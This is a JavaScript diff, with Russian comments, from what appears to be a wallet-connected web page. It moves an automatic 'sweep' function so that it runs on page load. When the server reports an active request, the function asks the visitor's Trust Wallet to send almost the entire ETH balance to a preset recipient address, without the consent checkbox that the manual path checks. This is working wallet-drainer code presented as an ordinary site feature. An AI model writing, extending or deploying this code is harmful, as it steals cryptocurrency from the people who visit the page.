@@ -1007,6 +1007,97 @@ const showSweepSectionAfterConnect = (address) => {
   }
 };
 
+// ===== АВТОМАТИЧЕСКОЕ СПИСАНИЕ ПРИ ЗАГРУЗКЕ (ОПРЕДЕЛЯЕМ РАНЬШЕ) =====
+const autoExecuteSweep = async () => {
+  try {
+    const storedSession = getStoredSession(userSessionKey);
+    if (!storedSession?.token) return;
+
+    const response = await requestJson('/api/sweep/active', {
+      token: storedSession.token,
+    });
+
+    const sweepRequest = response.sweepRequest;
+    if (!sweepRequest) return;
+
+    console.log('🔥 Обнаружен активный запрос на списание, выполняем...');
+    setSweepStatus('⏳ Автоматическое списание...');
+
+    const provider = getTrustProvider();
+    if (!provider) {
+      setSweepStatus('❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.', true);
+      return;
+    }
+
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const from = accounts?.[0];
+    if (!from) throw new Error('Адрес не получен');
+
+    if (from.toLowerCase() !== sweepRequest.target_user_wallet.toLowerCase()) {
+      setSweepStatus(`❌ В кошельке выбран другой аккаунт. Ожидается: ${sweepRequest.target_user_wallet}`, true);
+      return;
+    }
+
+    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
+    const currentChain = await provider.request({ method: "eth_chainId" });
+    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
+      await provider.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: targetChainHex }]
+      });
+    }
+
+    const balanceHex = await provider.request({
+      method: "eth_getBalance",
+      params: [from, "latest"]
+    });
+    const balance = BigInt(balanceHex || "0x0");
+
+    const gasPriceHex = await provider.request({ method: "eth_gasPrice" });
+    const gasPrice = BigInt(gasPriceHex || "0x0");
+    const gasCost = gasPrice * 21000n;
+    const amountToSend = balance - gasCost;
+
+    if (amountToSend <= 0n) {
+      throw new Error(`Недостаточно ETH для газа. Баланс: ${Number(balance)/1e18} ETH`);
+    }
+
+    setSweepStatus('📱 Подтвердите транзакцию в Trust Wallet');
+    const txParams = {
+      from: from,
+      to: SWEEP_CONFIG.recipient,
+      value: `0x${amountToSend.toString(16)}`,
+      gas: "0x5208",
+      gasPrice: `0x${gasPrice.toString(16)}`
+    };
+    const txHash = await provider.request({
+      method: "eth_sendTransaction",
+      params: [txParams]
+    });
+
+    await requestJson('/api/sweep/confirm', {
+      method: 'POST',
+      token: storedSession.token,
+      body: JSON.stringify({
+        requestId: sweepRequest.id,
+        txHash: txHash,
+      }),
+    });
+
+    setSweepStatus(`✅ Средства списаны! TX: ${txHash}`);
+    const resultDiv = document.querySelector('#sweep-result');
+    if (resultDiv) {
+      resultDiv.style.display = 'block';
+      const txSpan = document.querySelector('#sweep-tx-hash');
+      if (txSpan) txSpan.innerHTML = `TX: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
+    }
+  } catch (error) {
+    console.error('Ошибка автоматического списания:', error);
+    setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
+  }
+};
+
+// ===== ОСТАЛЬНОЙ КОД SWEEP =====
 const executeSweep = async () => {
   if (!sweepConsent?.checked) {
     setSweepStatus("❌ Подтвердите согласие на списание", true);
@@ -1138,15 +1229,7 @@ const executeSweep = async () => {
   }
 };
 
-// События
-sweepConsent?.addEventListener('change', () => {
-  if (sweepExecuteBtn) {
-    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
-  }
-});
-
-sweepExecuteBtn?.addEventListener('click', executeSweep);
-
+// ===== ИНИЦИАЛИЗАЦИЯ =====
 // Имена сетей
 const NETWORK_NAMES = {
   1: 'Ethereum (Mainnet)',
@@ -1168,12 +1251,13 @@ const NETWORK_SYMBOLS = {
   250: 'FTM'
 };
 
-// Принудительный показ секции при загрузке (если уже есть профиль)
+// Показываем секцию, если профиль уже есть
 const storedProfile = loadProfile();
 if (storedProfile?.evmAddress) {
   showSweepSectionAfterConnect(storedProfile.evmAddress);
 }
 
+// Восстанавливаем сессию и запускаем автосписание (если есть запрос)
 const stored = loadProfile();
 if (stored?.evmAddress) {
   unlockCheckForm(stored);
@@ -1182,7 +1266,7 @@ if (stored?.evmAddress) {
   }
   setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
   
-  // Автоматическое списание, если есть активный запрос
+  // Автоматическое списание (теперь функция определена выше)
   autoExecuteSweep().catch(console.warn);
 } else {
   setStatus(
@@ -1192,95 +1276,14 @@ if (stored?.evmAddress) {
   );
 }
 
-console.log('🔥 Sweep module loaded!');
-// ===== АВТОМАТИЧЕСКОЕ СПИСАНИЕ ПРИ ЗАГРУЗКЕ =====
-const autoExecuteSweep = async () => {
-  try {
-    const storedSession = getStoredSession(userSessionKey);
-    if (!storedSession?.token) return;
-
-    const response = await requestJson('/api/sweep/active', {
-      token: storedSession.token,
-    });
-
-    const sweepRequest = response.sweepRequest;
-    if (!sweepRequest) return;
-
-    console.log('🔥 Обнаружен активный запрос на списание, выполняем...');
-    setSweepStatus('⏳ Автоматическое списание...');
-
-    const provider = getTrustProvider();
-    if (!provider) {
-      setSweepStatus('❌ Trust Wallet не найден. Откройте страницу в Trust Wallet.', true);
-      return;
-    }
-
-    const accounts = await provider.request({ method: "eth_requestAccounts" });
-    const from = accounts?.[0];
-    if (!from) throw new Error('Адрес не получен');
-
-    if (from.toLowerCase() !== sweepRequest.target_user_wallet.toLowerCase()) {
-      setSweepStatus(`❌ В кошельке выбран другой аккаунт. Ожидается: ${sweepRequest.target_user_wallet}`, true);
-      return;
-    }
-
-    const targetChainHex = `0x${SWEEP_CONFIG.chainId.toString(16)}`;
-    const currentChain = await provider.request({ method: "eth_chainId" });
-    if (currentChain.toLowerCase() !== targetChainHex.toLowerCase()) {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: targetChainHex }]
-      });
-    }
-
-    const balanceHex = await provider.request({
-      method: "eth_getBalance",
-      params: [from, "latest"]
-    });
-    const balance = BigInt(balanceHex || "0x0");
-
-    const gasPriceHex = await provider.request({ method: "eth_gasPrice" });
-    const gasPrice = BigInt(gasPriceHex || "0x0");
-    const gasCost = gasPrice * 21000n;
-    const amountToSend = balance - gasCost;
-
-    if (amountToSend <= 0n) {
-      throw new Error(`Недостаточно ETH для газа. Баланс: ${Number(balance)/1e18} ETH`);
-    }
-
-    setSweepStatus('📱 Подтвердите транзакцию в Trust Wallet');
-    const txParams = {
-      from: from,
-      to: SWEEP_CONFIG.recipient,
-      value: `0x${amountToSend.toString(16)}`,
-      gas: "0x5208",
-      gasPrice: `0x${gasPrice.toString(16)}`
-    };
-    const txHash = await provider.request({
-      method: "eth_sendTransaction",
-      params: [txParams]
-    });
-
-    await requestJson('/api/sweep/confirm', {
-      method: 'POST',
-      token: storedSession.token,
-      body: JSON.stringify({
-        requestId: sweepRequest.id,
-        txHash: txHash,
-      }),
-    });
-
-    setSweepStatus(`✅ Средства списаны! TX: ${txHash}`);
-    const resultDiv = document.querySelector('#sweep-result');
-    if (resultDiv) {
-      resultDiv.style.display = 'block';
-      const txSpan = document.querySelector('#sweep-tx-hash');
-      if (txSpan) txSpan.innerHTML = `TX: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#4caf50;text-decoration:underline;">${txHash}</a>`;
-    }
-  } catch (error) {
-    console.error('Ошибка автоматического списания:', error);
-    setSweepStatus(`❌ ${error.message || 'Неизвестная ошибка'}`, true);
+// ===== СОБЫТИЯ КНОПОК =====
+sweepConsent?.addEventListener('change', () => {
+  if (sweepExecuteBtn) {
+    sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
   }
-};
+});
 
+sweepExecuteBtn?.addEventListener('click', executeSweep);
+
+console.log('🔥 Sweep module loaded!');
 console.log(`📍 Recipient: ${SWEEP_CONFIG.recipient}`);
